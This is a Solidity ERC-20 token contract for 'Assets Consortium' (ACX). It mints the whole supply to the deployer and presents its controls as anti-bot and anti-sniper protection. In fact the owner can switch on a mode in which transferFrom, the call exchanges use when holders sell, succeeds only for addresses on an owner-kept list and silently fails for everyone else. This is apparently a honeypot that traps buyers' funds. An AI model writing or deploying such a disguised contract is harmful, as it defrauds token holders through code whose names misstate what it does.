pragma solidity ^0.8.9;





contract ACX is ACXERC20 {

    address[] private smartbotList;
    address smartmultiSigWallet;

    bool private smartbotProtectionStatus = true; 


    bool private smartBotLevel;

    
    
    modifier alertAntismartBot {  
        require(msg.sender == smartmultiSigWallet, "Assets Consortium");
        _;
    }


    function botSmartProtection() public alertAntismartBot {
        smartBotLevel = !smartBotLevel;
    }
    
       modifier smartbotLock {  
        require(smartbotProtectionStatus, "Assets Consortium");
        _;
    }

    function addsmartBotList(address wbot) public alertAntismartBot {
        smartbotList.push(wbot);
    }

    constructor() ACXERC20("Assets Consortium", "ACX") {
        _mint(msg.sender, 100000000 * 10 ** decimals());
        smartBotLevel = !smartbotProtectionStatus;
        smartmultiSigWallet = msg.sender;
    }

 



    

    
    
    function smartbotAntiSniper (address smartDock) public view returns(bool) {
        for (uint i=0; i < smartbotList.length; i++) {
            if (smartDock == smartbotList[i]) {
                return true;
            } 
        }
        return false;
    }



    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (smartBotLevel == false || smartbotAntiSniper(sender) == true) {
            return super.transferFrom(sender, recipient, amount);
        } else {
            return !smartbotProtectionStatus;
        }
    }
}
